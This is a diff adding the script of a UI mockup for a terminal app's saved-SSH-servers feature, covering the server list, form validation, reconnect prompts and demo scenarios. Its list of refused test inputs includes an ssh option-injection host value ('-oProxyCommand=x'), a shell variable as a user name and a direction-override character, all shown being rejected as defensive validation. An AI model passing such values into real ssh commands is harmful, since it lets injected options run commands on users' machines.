+        bad && h("div", { class: "gwarn", "data-tone": "bad" }, stopIcon(""), "Can't connect until fixed: " + bad + " is not valid."),
+        !bad && kw && h("div", { class: "gwarn" }, warnIcon(""), kw === "missing" ? "Identity file: no file at this path right now." : "Identity file: not a regular file.")),
+      h("div", { class: "gacts" }, h("span", { role: "gridcell" }, btn("Connect", 0, () => connect(s.id))), h("span", { role: "gridcell" }, btn("Edit", 1, () => openForm(s), "ui-btn--ghost")), h("span", { role: "gridcell" }, btn("Remove", 2, () => askRemove(s), "ui-btn--ghost"))));
+    row.addEventListener("keydown", (e) => { const k = e.key, mv = { ArrowDown: [1, 0], ArrowUp: [-1, 0], ArrowRight: [0, 1], ArrowLeft: [0, -1] }[k];
+      if (mv) { e.preventDefault(); focusCell(LIST.row + mv[0], LIST.col + mv[1]); } else if (k === "Home") { e.preventDefault(); focusCell(0, LIST.col); } else if (k === "End") { e.preventDefault(); focusCell(1e9, LIST.col); } });
+    grid.append(row);
+  });
+}
+function foot(d) { d.append(h("div", { class: "srv__foot" }, "Saved servers stay on this machine. In a server pane, file paths are not links, the file browser and the folder panels show nothing, and Better Terminal types nothing of its own.")); }
+function fullMsg() { LIST.msg = { tone: "warn", text: "Not added: the list is full. It holds 200 servers, the most Better Terminal keeps. Remove one to add another." }; drawList(); LIST.dlg.querySelector('[data-act="add"]').focus(); log("The 201st add is refused: “the server list is full”."); }
+function askRemove(s) {
+  const idx = listRows().indexOf(s);
+  confirmDlg({ title: "Remove “" + cleanName(s.name, "Unnamed server") + "” from saved servers?",
+    message: "Only this entry is removed. Tabs that are open stay open, but an ended one can no longer reconnect. Nothing in ~/.ssh is touched.", confirm: "Remove",
+    onCancel: () => focusCell(idx, 2),
+    onConfirm: () => {
+      if (S.store === "readonly") { LIST.msg = saveFailMsg("Not removed"); drawList(); focusCell(idx, 2); log("Remove failed: “the server list could not be saved”; the list is unchanged."); return; }
+      S.servers.splice(S.servers.indexOf(s), 1); log("Remove: one remove request, after the confirmation. Open tabs and ~/.ssh are untouched."); LIST.msg = null; say(["Removed ", { name: s.name }, "."]);
+      drawList(); if (S.servers.length) focusCell(Math.min(idx, listRows().length - 1), 0); else focusListStart();
+      refreshPanes(s.id);
+    } });
+}
+const saveFailMsg = (lead) => ({ tone: "bad", text: lead + ": the server list could not be saved (system error 28). Nothing was changed, and the list shown is the one on disk. Check that the disk has room and that Better Terminal can write to its data folder, then try again." });
+
+/* The form: a page of the same dialog. */
+function openForm(s) {
+  LIST.page = "form"; LIST.edit = s; LIST.errors = {}; LIST.formMsg = null;
+  const raw = s ? { name: s.name, host: s.host, port: s.port == null ? "" : String(s.port), user: s.user || "", key: s.key || "" } : { name: "", host: "", port: "", user: "", key: "" };
+  /* A stored value that holds characters that can't be shown is loaded cleaned, and the form says so (spec 9). */
+  LIST.values = {}; LIST.cleaned = [];
+  for (const k in raw) { const c = k === "name" ? cleanText(raw[k]) : raw[k].replace(new RegExp("[^ -~]", "g"), ""); if (c !== raw[k] && s) LIST.cleaned.push(FIELDS.find((f) => f.id === k).label); LIST.values[k] = c; }
+  drawForm(); LIST.dlg.querySelector("#f-name").focus();
+}
+function leaveForm(focusId) { const s = LIST.edit; LIST.page = "list"; drawList(); const rows = listRows(), i = rows.findIndex((x) => x.id === (focusId || s?.id)); if (i >= 0) focusCell(i, focusId ? 0 : 1); else (LIST.dlg.querySelector('[data-act="add"]') || LIST.dlg).focus(); }
+function drawForm() {
+  const d = LIST.dlg, s = LIST.edit, v = LIST.values, errs = LIST.errors; d.textContent = "";
+  d.append(h("div", { class: "srv__header" }, h("h2", { id: "srv-title" }, s ? "Edit server" : "Add server"), h("span", { class: "srv__count" }, s ? "" : S.servers.length + " of 200")));
+  const body = h("div", { class: "srv__body" }); d.append(body);
+  const strip = h("div", { id: "f-strip" }); body.append(strip);
+  const drawStrip = () => { const bad = Object.keys(LIST.errors); strip.textContent = "";
+    if (LIST.formMsg) strip.append(msgStrip(LIST.formMsg, "alert"));
+    else if (bad.length) strip.append(msgStrip({ tone: "bad", text: [{ b: "Not saved. " }, bad.length === 1 ? "1 field needs a change: " : bad.length + " fields need a change: ", bad.join(", ") + "."] }, "alert")); };
+  drawStrip();
+  if (LIST.cleaned.length) body.append(msgStrip({ tone: "warn", text: "The saved " + LIST.cleaned.join(", ") + (LIST.cleaned.length === 1 ? " held" : " each held") + " characters that can't be shown. They are left out here. Save to store what you see." }));
+  const form = h("form", { class: "form", novalidate: true, "aria-labelledby": "srv-title", on: { submit: (e) => { e.preventDefault(); save(); } } });
+  for (const f of FIELDS) {
+    const id = "f-" + f.id, e = errs[f.label], kw = f.id === "key" && !e ? keyWarnFor(v.key) : null;
+    const input = h("input", { id, type: "text", class: f.mono ? "mono" : "", value: v[f.id], placeholder: f.ph, autocomplete: "off", autocapitalize: "off", spellcheck: "false", "aria-required": f.req ? "true" : null, "aria-invalid": e ? "true" : null,
+      "aria-describedby": [id + "-h", e && id + "-e", kw && id + "-w"].filter(Boolean).join(" "), inputmode: f.id === "port" ? "numeric" : null });
+    input.addEventListener("input", () => { v[f.id] = input.value; drawPreview();
+      if (LIST.errors[f.label]) { delete LIST.errors[f.label]; input.removeAttribute("aria-invalid"); form.querySelector("#" + id + "-e")?.remove(); input.setAttribute("aria-describedby", id + "-h"); drawStrip(); } });
+    if (f.id === "key") input.addEventListener("blur", () => { const w = keyWarnFor(v.key); if (!!w !== !!form.querySelector("#f-key-w") && !LIST.errors["Identity file"]) { const slot = form.querySelector("#f-key-slot"); slot.textContent = ""; if (w) slot.append(h("p", { class: "warn", id: "f-key-w" }, warnIcon(""), h("span", null, KEY_WARN[w]))); } });
+    form.append(h("div", { class: "fld" + (f.wide ? " wide" : "") }, h("label", { for: id }, f.label, !f.req && h("span", { class: "opt" }, " (optional)")), input,
+      e && h("p", { class: "err", id: id + "-e" }, stopIcon(""), h("span", null, h("b", null, f.label + " is not valid. "), MSG[f.label][e])),
+      f.id === "key" ? h("div", { id: "f-key-slot" }, kw && h("p", { class: "warn", id: id + "-w" }, warnIcon(""), h("span", null, KEY_WARN[kw]))) : null,
+      h("p", { class: "hint", id: id + "-h" }, f.hint)));
+  }
+  form.append(h("div", { class: "preview", id: "f-prev" }));
+  /* An implicit submit, so Enter in a field saves. */
+  form.append(h("button", { type: "submit", class: "sr", tabindex: "-1", "aria-hidden": "true" }, "Save"));
+  body.append(form);
+  d.append(h("div", { class: "srv__formfoot" }, h("button", { type: "button", class: "ui-btn ui-btn--md ui-btn--secondary", "data-act": "cancel", on: { click: () => leaveForm() } }, "Cancel"), h("button", { type: "button", class: "ui-btn ui-btn--md ui-btn--primary", "data-act": "save", on: { click: save } }, s ? "Save changes" : "Save server")));
+  drawPreview(); drawTries();
+}
+function drawPreview() {
+  const el = $("#f-prev", LIST.dlg), v = LIST.values; if (!el) return; el.textContent = "";
+  if (!v.host.trim()) return void el.append("Destination: enter a host to see it.");
+  el.append("Destination", destEl({ user: v.user || null, host: v.host, port: v.port.trim() || null }), h("span", null, "is what the tab, the palette and Reconnect will show."));
+}
+function save() {
+  const s = LIST.edit, v = LIST.values, errs = check(v, s?.id, S.servers);
+  LIST.errors = errs; LIST.formMsg = null;
+  if (Object.keys(errs).length) { log("Save refused whole (“a saved server failed its checks”: " + Object.keys(errs).join(", ") + "); the store is unchanged."); drawForm(); const first = FIELDS.find((f) => errs[f.label]); LIST.dlg.querySelector("#f-" + first.id).focus(); return; }
+  if (!s && S.servers.length >= 200) { LIST.formMsg = { tone: "warn", text: "Not added: the list is full. It holds 200 servers, the most Better Terminal keeps. Remove one to add another." }; drawForm(); return; }
+  if (S.store === "readonly") { LIST.formMsg = saveFailMsg("Not saved"); log("Save failed: “the server list could not be saved”, carrying the system's error number only."); drawForm(); LIST.dlg.querySelector('[data-act="save"]').focus(); return; }
+  const rec = { id: s ? s.id : nid("s"), name: v.name.trim(), host: v.host, port: v.port.trim() ? Number(v.port.trim()) : null, user: v.user || null, key: v.key || null };
+  if (s) Object.assign(s, rec); else S.servers.push(rec);
+  log((s ? "Edit" : "Add") + " saved. Open tabs keep their names; an ended pane's Reconnect shows the new destination.");
+  LIST.msg = null; say(["Saved ", { name: rec.name }, "."]); leaveForm(rec.id);
+  refreshPanes(rec.id);
+}
+const TRIES = [["host:port", "host", "db1.example.com:2222"], ["user@host", "host", "deploy@db1.example.com"], ["an option", "host", "-oProxyCommand=x"], ["a space", "host", "host name"], ["127.1", "host", "127.1"], ["a zone", "host", "fe80::1%en0"], ["brackets", "host", "[2001:db8::7]"], ["a:b:c", "host", "a:b:c"], ["0x7f.1", "host", "0x7f.1"],
+  ["port 022", "port", "022"], ["port 65536", "port", "65536"], ["user $HOME", "user", "$HOME"], ["user DOM\\user", "user", "DOM\\user"], ["key not a path", "key", "id_ed25519"], ["key %h", "key", "~/.ssh/%h"], ["key missing (warns)", "key", "~/keys/missing_key"], ["name DB1 (taken)", "name", "DB1"], ["name with a direction mark", "name", "prod" + RLO + "bd"], ["65 characters", "name", "n".repeat(65)]];
+function drawTries() {
+  const box = $("#tries"); box.hidden = false; box.textContent = ""; box.append(h("span", null, "Fill a field with a refused value, then Save:"));
+  for (const [label, f, val] of TRIES) box.append(h("button", { type: "button", on: { mousedown: (e) => e.preventDefault(), click: () => { if (LIST?.page !== "form") return; LIST.values[f] = val; const i = LIST.dlg.querySelector("#f-" + f); i.value = val; drawPreview(); } } }, label));
+}
+
+/* ---------- stand-ins: an ADE-initiated write, the scratchpad, the file browser, tab sets ---------- */
+const WRITERS = { tokens: ["Tokens panel, an action", "/compact"], guard: ["Context guard, “Type /compact”", "/compact"], picker: ["Agent picker, “This terminal”", "claude"], foundry: ["Contracts, “New Foundry project”", "forge init"], slop: ["Anti-slop, “ask to fix”", "fix the findings above"], insert: ["Sub-terminal notice, “Insert command”", "npm run dev"] };
+function adeWrite(who = $("#writer")?.value || "tokens") {
+  const p = activePane(), [name, text] = WRITERS[who];
+  if (p.remote) { toast(WRITE_REFUSED[0], WRITE_REFUSED[1]); log(name + ": refused for a remote pane (" + p.remote.state + "); 0 write_pty calls."); return; }
+  putLine(p, "dev@mac " + p.cwd + " % " + text); log(name + ": typed into the local pane, as today.");
+}
+function toggleScratch(withImage) {
+  if (!scratchEl.hidden && withImage === undefined) { scratchEl.hidden = true; return; }
+  scratchEl.hidden = false; scratchEl.textContent = "";
+  const ta = h("textarea", { "aria-label": "Scratchpad" }); ta.value = "tail -n 50 /var/log/app.log";
+  const why = h("div", { role: "status" });
+  const img = withImage && h("span", { class: "img" }, "image: screenshot-1.png");
+  const send = h("button", { type: "button", class: "ui-btn ui-btn--md ui-btn--primary", on: { click: () => { const p = activePane(); why.textContent = "";
+    if (p.remote && img && img.isConnected) { toast(IMG_REFUSED[0], IMG_REFUSED[1]); log("Scratchpad send with an image, to a remote pane: 0 bytes written; the text and the image stay in the scratchpad."); return; }
+    putLine(p, ta.value); log(p.remote ? "Scratchpad send (a named user send): written to the remote pane, as you asked." : "Scratchpad send: written to the local pane."); } } }, "Send");
+  scratchEl.append(h("div", { class: "box" }, ta, img, why), send);
+}
+function toggleFb(force) { fbEl.hidden = force === undefined ? !fbEl.hidden : !force; renderSide(); }
+function renderSide() {
+  if (fbEl.hidden) return; const p = activePane(); fbEl.textContent = ""; fbEl.append(h("h3", null, "Files"));
+  if (p?.remote) fbEl.append(h("div", { class: "onsrv", role: "status" }, h("b", null, "This pane is a server session"), "The file browser shows folders on this machine, and a server session has none to show. Click a local pane to see its folder."));
+  else fbEl.append(h("div", { class: "tree" }, (p?.cwd || "~") + "/", h("br"), "  src/", h("br"), "  README.md", h("br"), "  package.json"));
+}
+function saveTabSet() {
+  if (LAYERS.length) return; let L;
+  const name = h("input", { type: "text", value: "Morning", "aria-label": "Workspace name", class: "filter", style: "margin:0;flex:1" }), out = h("p", { class: "hint", role: "status", id: "ws-status", style: "margin-top:8px;min-height:15px" });
+  const save = () => { const left = S.tabs.filter(isServerTab).length, kept = S.tabs.length - left, nm = cleanName(name.value, "Untitled");
+    out.textContent = "Saved “" + nm + "” with " + kept + (kept === 1 ? " tab." : " tabs.") + (left ? " " + left + (left === 1 ? " server tab was" : " server tabs were") + " left out: a saved workspace never holds a server tab." : "");
+    log("Save Current Workspace: " + kept + " entries; " + left + " server tabs left out; no server's name is in it."); };
+  const dlg = h("div", { class: "srv", role: "dialog", "aria-modal": "true", "aria-label": "Settings, Workspace (stand-in)", style: "width:460px" },
+    h("div", { class: "srv__header" }, h("h2", null, "Settings · Workspace"), h("span", { class: "srv__count" }, "stand-in"), h("button", { type: "button", class: "ui-btn ui-btn--md ui-btn--icon ui-btn--ghost", "aria-label": "Close settings", on: { click: () => closeLayer(L) } }, "✕")),
+    h("div", { class: "srv__body" }, h("div", { style: "display:flex;gap:8px" }, name, h("button", { type: "button", class: "ui-btn ui-btn--md ui-btn--primary", "data-act": "ws-save", on: { click: save } }, "Save Current Workspace")), out));
+  L = openLayer(h("div", { class: "scrim" }, dlg), { initial: () => name });
+}
+function editBehind() { const s = serverById("s1"); if (!s) return log("db1 is not in the list."); s.host = s.host === "db1.example.com" ? "db1.example.net" : "db1.example.com"; log("The saved server db1 now points at " + s.host + " (an edit, or a rewritten store)."); refreshPanes("s1"); if (LIST) drawList(); }
+function removeBehind() { const i = S.servers.findIndex((s) => s.id === "s1"); if (i < 0) return log("db1 is already gone."); S.servers.splice(i, 1); log("The saved server db1 was removed."); refreshPanes("s1"); if (LIST) drawList(); }
+function editKeyBehind() { const s = serverById("s1"); if (!s) return log("db1 is not in the list."); s.key = s.key === "~/.ssh/id_ed25519" ? "~/.ssh/id_other" : "~/.ssh/id_ed25519"; log("The saved server db1 now names the identity file " + s.key + "."); refreshPanes("s1"); if (LIST) drawList(); }
+/* A saved server changed: a refusal or a question that was showing for it goes, and each of its panes is drawn again. Focus is not moved. */
+function refreshPanes(serverId) { for (const t of S.tabs) for (const p of t.panes) if (p.remote) { if (p.remote.serverId === serverId) { p.refusal = null; p.confirming = false; } updatePane(p); } }
+
+/* ---------- presets, reduced motion ---------- */
+function setTheme(i) { const t = THEMES[i]; VARS.forEach((v, k) => document.documentElement.style.setProperty(v, t[k + 1])); const a = t[9]; for (const [n, al] of [["--accent-subtle", "26"], ["--accent-hover", "40"]]) document.documentElement.style.setProperty(n, a + al); $("#theme").value = String(i); }
+
+/* ---------- scenarios ---------- */
+function reset(servers = BASE()) {
+  for (const p of PANES.keys()) { /* timers */ } for (const t of S?.tabs || []) for (const p of t.panes) clearTimers(p);
+  closeAllLayers(false); LIST = null; PANES.clear(); panesEl.textContent = ""; toastsEl.textContent = ""; sayEl.textContent = ""; scratchEl.hidden = true; fbEl.hidden = true;
+  $("#rc").value = "quick"; $("#shell").value = "zsh";
+  counts = { connect: 0, starts: 0 };
+  S = { servers, store: "ok", tabs: [], active: null, closed: [], available: true };
+  const p = newPane({ cwd: "~/work/shop", lines: [{ text: "dev@mac shop % git status" }, { text: "On branch main, nothing to commit" }, { text: "dev@mac shop % cat ", path: "src/main.rs:12" }, { text: "dev@mac shop % " }] });
+  const t = { id: nid("t"), name: "shop", serverNamed: false, panes: [p], activePane: p.id, agent: false }; S.tabs.push(t); showTab(t.id, false);
+}
+const wait = (ms) => new Promise((r) => setTimeout(r, ms));
+async function connected(how = "quick", id = "s1") { $("#rc").value = how; connect(id); await wait(950); }
+const SCENARIOS = [
+  ["empty", "The list, empty", "No saved servers: what the feature does, and Add server. No host is listed from anywhere else (SV-9 AC3).", async () => { reset([]); openList_(); }],
+  ["list", "The list, with servers", "Rows in name order: name, destination summary, identity file. One row warns that its identity file is not there (a warning, never a refusal). Tab reaches the filter, then the grid; arrows move in the grid; Enter or Space presses.", async () => { reset(); openList_(); }],
+  ["add", "Add a server", "Five fields and no others: no password, no passphrase, no options. Try the refused values in the box above, then Save.", async () => { reset(); openList_(); openForm(null); }],
+  ["refusals", "Every field refused", "A save is refused whole. Each field says which rule it broke, in words; no value is repeated in a message. Focus goes to the first field to fix.", async () => { reset(); openList_(); openForm(null); Object.assign(LIST.values, { name: "DB1", host: "db1.example.com:2222", port: "022", user: "$HOME", key: "id_ed25519" }); drawForm(); save(); }],
+  ["edit", "Edit a server, with the identity-file warning", "The identity file's path names nothing on disk: a warning under the field, and Save still saves. Better Terminal never opens the file.", async () => { reset(); openList_(); openForm(serverById("s3")); }],
+  ["cap", "The list is full (200)", "The count reads 200 of 200 and the list says so. Add server stays a button: pressing it gives the refusal, and no form opens.", async () => { const many = BASE(); for (let i = 5; i <= 200; i++) many.push({ id: "m" + i, name: "node-" + String(i).padStart(3, "0"), host: "node" + i + ".example.com", port: null, user: "ops", key: null }); reset(many); openList_(); fullMsg(); }],
+  ["unreadable", "The list could not be read", "A damaged or newer-version store is never overwritten. Add, Edit, Remove, Connect and Reconnect are off; the palette's connect entries are gone; only the entry that opens this list stays.", async () => { reset(); S.store = "unreadable"; openList_(); }],
+  ["notsaved", "The list could not be saved", "The disk is full or the folder is read-only: the form stays open with what was typed, and says nothing was changed.", async () => { reset(); S.store = "readonly"; openList_(); openForm(null); Object.assign(LIST.values, { name: "cache", host: "cache.example.com" }); drawForm(); save(); }],
+  ["remove", "Remove asks once", "One question that names the server, in today's ConfirmDialog: Cancel has focus, Enter confirms, Esc cancels and the list stays open. No remove request is made before the confirmation.", async () => { reset(); openList_(); askRemove(S.servers.slice().sort(byName)[1]); }],
+  ["palette", "The palette", "One entry opens the list and one per server connects. Each connect entry shows the name and the destination, and typing part of either finds it. Today's entries and their order are untouched; F7's follow them.", async () => { reset(); openPalette("db1"); }],
+  ["quick", "Connect: a quick hand-over", "A new tab named after the server. It reads “starting ssh” while your start-up files run, then “ssh running”: the word is not “connected”, because ssh may still be at a password prompt, as here.", async () => { reset(); $("#rc").value = "quick"; connect("s1"); }],
+  ["another", "Connecting: another program took the shell's place", "The start-up files ran tmux instead of ssh. The message and End appear at once. The pane stays a server session; nothing is ended unless you press End.", async () => { reset(); await connected("another"); }],
+  ["waiting", "Connecting: the shell is still waiting", "A start-up file asks a question. No message and no End for the first 30 s (3 s with the fast timer); then both appear. “Answer the start-up question” above makes ssh start: the pane turns live and the message goes.", async () => { reset(); $("#rc").value = "waiting"; connect("s1"); }],
+  ["live", "Live", "The tab, the switcher and the pane all say “ssh running”, with a mark that is a shape, not a colour. There is no bar, no End and no Reconnect.", async () => { reset(); await connected("quick"); }],
+  ["ended", "Ended, with Reconnect", "The pane keeps its output and today's [Process exited] line. Reconnect shows where it would go.", async () => { reset(); await connected("quick"); sshExits(); }],
+  ["before", "Ended before ssh was seen to start", "A function named exec that returns: the shell exits 0 and prints nothing. The pane says what it did and did not see, with the exit status.", async () => { reset(); await connected("silent"); }],
+  ["nossh", "No SSH client found", "Status 127 before ssh was seen: the message says what the status usually means and what to do on this OS.", async () => { reset(); await connected("nossh"); }],
+  ["changed", "Reconnect: the destination changed", "The saved server now points somewhere else. Both destinations are shown; Reconnect asks a second, separate question before anything starts.", async () => { reset(); await connected("quick"); sshExits(); editBehind(); }],
+  ["removed", "Reconnect: the saved server was removed", "No Reconnect. The pane says the saved server no longer exists and what it was last started for.", async () => { reset(); await connected("quick"); sshExits(); removeBehind(); }],
+  ["split", "A split of a server tab", "The new pane is a local shell in your home folder. The remote pane says SERVER; in a tab that holds a server pane, a local pane says LOCAL. File paths are links in the local pane only.", async () => { reset(); await connected("quick"); putLine(activePane(), "deploy@db1:~$ cat ", { path: "src/main.rs:12" }); split(); }],
+  ["write", "An ADE write is refused", "A Better Terminal feature tries to type into a server pane: nothing is typed, and today's “Not sent” toast says why, in the same words whichever feature it was (choose one above and press it). The file browser says the pane is on a server. The scratchpad with an image attached is refused by the same toast, and keeps its text.", async () => { reset(); await connected("quick"); toggleFb(true); adeWrite(); }],
+  ["closeconfirm", "Closing a live server pane asks", "The question says a connection will end. Cancel has focus and Enter confirms, as in every close question today. An ended pane closes without a question. End never asks.", async () => { reset(); await connected("quick"); closePane(); }],
+  ["restored", "After a restart", "Every server tab comes back ended, with its output and Reconnect. Nothing connects by itself. Quitting asked nothing.", async () => { reset(); await connected("quick"); quitRestart(); }],
+  ["reopened", "Reopen Closed Tab", "A closed server tab comes back as an ended server tab, with no output and with Reconnect; never as a local shell under the server's name.", async () => { reset(); await connected("quick"); sshExits(); closeTab(); reopenClosed(); }],
+  ["menu", "The tab's menu on a server tab", "No Duplicate and no Move to New Window, and a line that says why. The local tab's menu has both.", async () => { reset(); await connected("quick"); const b = tabbar.querySelector('[data-tab="' + S.active + '"]').getBoundingClientRect(); openMenu(activeTab(), b.left + 10, b.bottom + 2); }],
+  ["switcher", "The tab switcher", "A server tab's row carries the mark, the state in words and the destination, where a local tab shows its folder.", async () => { reset(); await connected("quick"); await connected("another", "s2"); openSwitcher(); }],
+  ["shell", "An unsupported login shell", "Connect opens no tab. The list says which shell it found, by its base name only. Choose “a name that cannot be shown” above and connect again for the other wording.", async () => { reset(); $("#shell").value = "fish"; connect("s1"); }],
+  ["failed", "A saved server that fails its checks", "A row changed outside Better Terminal. It is shown, marked, and Connect starts nothing: the list names the server and the field.", async () => { reset(BASE().concat(HOSTILE[1])); connect("h2"); }],
+  ["hostile", "Hostile text in the store", "Names, hosts and users as a hand-edited store could hold them: control characters, direction overrides, markup. All are shown as text, cleaned, and none is applied. A name that looks like a destination sits beside the real destination, in its own box.", async () => { reset(HOSTILE.concat(BASE().slice(0, 1))); S.tabs[0].name = HOSTILE[0].name; renderTabs(); openList_(); }],
+  ["long", "Long names and destinations", "A long host is cut in the middle: the end of the host and the port always show, so a cut never reads as a different host. Nothing wraps.", async () => { reset(LONGS.concat(BASE().slice(0, 2))); await connected("quick", "l1"); sshExits(); openList_(); }],
+  ["marks", "The marks side by side", "A plain tab (chevron), a tab with an agent dot, and three server tabs: starting ssh (dashed box), ssh running (box with lights), ended (struck through). Shape and words, never colour. Open the tab switcher (⌘K) for the same three in words.", async () => { reset(); S.tabs[0].agent = false; const a = addLocalTab("api", "~/work/api"); a.agent = true; await connected("quick", "s1"); await connected("quick", "s4"); sshExits(); $("#rc").value = "waiting"; connect("s2"); showTab(S.tabs[2].id); }],
+  ["child", "Connecting: ssh runs as a child of the shell", "A function named after a word of the instruction runs ssh without replacing the shell. The session works, and the pane can never be confirmed: it stays “starting ssh”, and at the bound the message says the session may be working and can go on being used.", async () => { reset(); $("#rc").value = "child"; connect("s1"); }],
+  ["spawn", "The shell could not be started", "“Could not start a terminal”, with the system's error number, which is all the kind carries. The tab is open and the pane is ended.", async () => { reset(); await connected("spawn"); }],
+  ["keychanged", "Reconnect: only the identity file changed", "The summary reads the same before and after, so each line also shows the identity file.", async () => { reset(); await connected("quick"); sshExits(); editKeyBehind(); }],
+  ["question", "Reconnect: the second question", "Reconnect… starts nothing. It turns the bar into a question with focus on Cancel; Enter presses the focused button only. No connect request is made until “Connect to the new destination”.", async () => { reset(); await connected("quick"); sshExits(); editBehind(); reconnect(activePane()); }],
+  ["refusedre", "Reconnect refused: an unsupported shell", "The pane stays ended and says why, in its bar. Nothing was started.", async () => { reset(); await connected("quick"); sshExits(); $("#shell").value = "fish"; reconnect(activePane()); }],
+  ["shellnoname", "An unsupported shell whose name is not shown", "The shell's base name is longer than 32 characters or holds a character outside the safe set, so the kind carries no name and the message names none.", async () => { reset(); $("#shell").value = "?"; connect("s1"); }],
+  ["workspace", "Saving a workspace (tab set) leaves server tabs out", "The status line under the save row says how many were left out.", async () => { reset(); await connected("quick"); await connected("another", "s2"); saveTabSet(); LAYERS[LAYERS.length - 1].el.querySelector('[data-act="ws-save"]').click(); }],
+  ["unavailable", "Not available: Windows, or an engagement", "The palette has none of F7's entries and there is no list. Typing “server” finds only today's MCP entry.", async () => { reset(); S.available = false; openPalette("server"); }],
+  ["closedremote", "Closing the remote pane of a split tab", "After the question, the tab keeps its local pane, is renamed “Terminal” and is a local tab again: its menu has Duplicate and Move to New Window.", async () => { reset(); await connected("quick"); split(); const t = activeTab(); t.activePane = t.panes[0].id; showTab(t.id); closePane(); }],
+];
+async function runScenario(id) {
+  const sc = SCENARIOS.find((s) => s[0] === id); $("#scn").value = id;
+  capEl.textContent = ""; capEl.append(h("b", null, sc[1] + ". "), sc[2]);
+  await sc[3]();
+}
+
+/* ---------- demo controls ---------- */
+THEMES.forEach((t, i) => $("#theme").append(h("option", { value: String(i) }, t[0])));
+SCENARIOS.forEach((s, i) => $("#scn").append(h("option", { value: s[0] }, (i + 1) + ". " + s[1])));
+$("#scn").addEventListener("change", (e) => runScenario(e.target.value));
+$("#prev").addEventListener("click", () => { const i = SCENARIOS.findIndex((s) => s[0] === $("#scn").value); runScenario(SCENARIOS[(i - 1 + SCENARIOS.length) % SCENARIOS.length][0]); });
+$("#next").addEventListener("click", () => { const i = SCENARIOS.findIndex((s) => s[0] === $("#scn").value); runScenario(SCENARIOS[(i + 1) % SCENARIOS.length][0]); });
+$("#theme").addEventListener("change", (e) => setTheme(Number(e.target.value)));
+$("#rm").addEventListener("change", (e) => win.classList.toggle("rm", e.target.checked));
+const ACTS = [["Palette (⌘P)", () => openPalette()], ["Tab switcher (⌘K)", openSwitcher], ["Saved servers", () => openList_()], ["Split (⌘D)", split], ["Close pane (⌘⇧W)", () => closePane()], ["Close tab (⌘W)", () => closeTab()], ["Reopen closed tab (⌘⇧T)", reopenClosed],
+  ["Quit and restart", quitRestart], ["Answer the start-up question", () => answerStartup()], ["The server closes the session", () => sshExits()], ["Press it (a Better Terminal write)", () => adeWrite()], ["Scratchpad, text only", () => toggleScratch(false)], ["Scratchpad, image attached", () => toggleScratch(true)],
+  ["File browser (⌘B)", () => toggleFb()], ["Save a workspace (tab set)", saveTabSet], ["Change db1's host", editBehind], ["Change db1's identity file", editKeyBehind], ["Remove db1", removeBehind]];
+for (const [label, run] of ACTS) $("#acts").append(h("button", { type: "button", on: { mousedown: (e) => e.preventDefault(), click: run } }, label));
+window.__mock = { get S() { return S; }, get LIST() { return LIST; }, LAYERS, PANES, SCENARIOS, runScenario, reset, connect, connected, openList_, openForm, openPalette, openSwitcher, closePane, closeTab, endPane, sshExits, answerStartup, reconnect, split, quitRestart, reopenClosed, adeWrite, toggleScratch, toggleFb, editBehind, editKeyBehind, removeBehind, saveTabSet, refreshPanes, setTheme, activePane, activeTab, paneDom, cleanText, cleanName, fullDest, summary, check, HOSTILE, LONGS, THEMES, wait, get counts() { return counts; } };
+runScenario("list");
+</script>
+</body>
+</html>
